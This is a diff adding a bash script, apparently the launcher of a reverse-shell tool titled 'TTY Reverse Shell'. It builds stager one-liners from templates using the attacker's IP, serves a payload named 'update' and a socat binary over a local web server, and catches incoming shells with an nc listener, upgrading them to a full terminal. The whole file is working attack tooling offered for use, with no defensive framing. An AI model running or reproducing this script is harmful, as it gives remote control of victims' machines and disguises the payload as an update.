@@ -1,0 +1,113 @@
+#!/usr/bin/env bash
+#TTY Reverse Shell
+
+#Find and CD to the directory of the script.
+source="${BASH_SOURCE[0]}"
+while [ -h "$source" ]; do
+	dir="$( cd -P "$( dirname "$source" )" && pwd )"
+	source="$( readlink "$source" )"
+	[[ $source != /* ]] && source="$dir/$source"
+done
+FPATH=$( cd -P "$( dirname "$source" )" && pwd )
+
+INT='wlan0'
+IP=$(ip a show $INT | grep -w inet | awk {'print $2'} | cut -f1 -d"/")
+WPORT='8080'
+LPORT='4444'
+TPL=$FPATH/templates
+OUT=$FPATH/output
+PAYLOAD=$TPL/payload
+PL_NAME=update
+URL="http://$IP:$WPORT/$PL_NAME"
+SCBIN=$FPATH/tools/socat-bin
+SCURL="http://$IP:$WPORT/bin/sc"
+
+#Colors & Style
+plu='\e[32m[+]\e[0m'
+min='\e[31m[-]\e[0m'
+sta='\e[34m[*]\e[0m'
+redS='\e[31m'
+magS='\e[95m'
+grnS='\e[92m'
+CEND='\e[0m'
+boldS='\e[1m'
+boldE='\e[21m'
+
+
+function allinone_conf {
+	dir=$1
+	lang=$2
+	aiofile="$dir/allinone"
+	tmpaio=".aio.$lang"
+	result="$OUT/aio.$lang"
+	cp $aiofile $tmpaio
+	sed -i "s/#IP#/$IP/g" $tmpaio
+	sed -i "s/#WPORT#/$WPORT/g" $tmpaio
+	sed -i "s/#PL_NAME#/$PL_NAME/g" $tmpaio
+	sed -i "s,#URL#,$URL,g" $tmpaio
+	mv $tmpaio $result
+	echo -e ">> "$boldS"All In One"$boldE" : $magS$result$CEND"
+}
+
+function oneline_conf {
+	dir=$1
+	lang=$2
+	olfile=$dir/oneline
+	oltmp=".oneline.$lang"
+	cp $olfile $oltmp
+	sed -i "s,#IP#,$IP,g" $oltmp
+	sed -i "s,#WPORT#,$WPORT,g" $oltmp
+	sed -i "s,#PL_NAME#,$PL_NAME,g" $oltmp
+	sed -i "s,#URL#,$URL,g" $oltmp	
+	echo -e ">> "$boldS"One-Line"$boldE" :"
+	echo
+	while read oneline;do
+		[ ! -z "$oneline" ] && echo -e "> $grnS$oneline$CEND\n"
+	done <$oltmp
+	rm $oltmp
+}
+
+for dir in $TPL/*;do
+	if [ -d $dir ];then
+		lang=$(basename $dir)
+		echo -e "{{ $redS${lang^^}$CEND }}"
+		echo
+		allinone_conf $dir $lang
+		echo
+		oneline_conf $dir $lang
+		echo
+	fi
+done
+
+#MAIN PAYLOAD CONFIG
+cp $PAYLOAD .$PL_NAME
+sed -i s/#IP#/$IP/g .$PL_NAME
+sed -i s/#LPORT#/$LPORT/g .$PL_NAME
+sed -i s,#SCURL#,$SCURL,g .$PL_NAME
+
+#WEBSERVER
+rm -rf .web 2>/dev/null
+mkdir .web
+mkdir .web/bin
+mv .$PL_NAME .web/$PL_NAME
+cp $SCBIN/* .web/bin/
+cd .web
+echo -e "$plu Starting WebServer on port $WPORT."
+python3 -m http.server $WPORT &>/dev/null &
+WEB_PID=$!
+cd ..
+
+#LISTENER
+echo -e "$plu Start listenning on port $LPORT."
+echo
+ROWS=$(stty -a | head -n1 | awk {'print $5'} | tr -d ';')
+COLS=$(stty -a | head -n1 | awk {'print $7'} | tr -d ';')
+cat <(echo 'if ! tty &>/dev/null;then expect -c "spawn $SHELL; interact" && exit;fi';stty raw -echo;echo 'if stty &>/dev/null;then stty sane;export SHELL=$0;export TERM=xterm-256color;stty rows '$ROWS' columns '$COLS';fi;ls --color=al > /dev/null 2>&1 && alias ls="ls -F --color=al" || alias ls="ls -G";') - | nc -lp $LPORT
+
+#KILL CLEAN AND EXIT
+stty sane
+kill $WEB_PID
+wait $WEB_PID 2>/dev/null
+rm -rf .web
+echo -e "$plu Exiting ttyRS. Bye!"
+exit
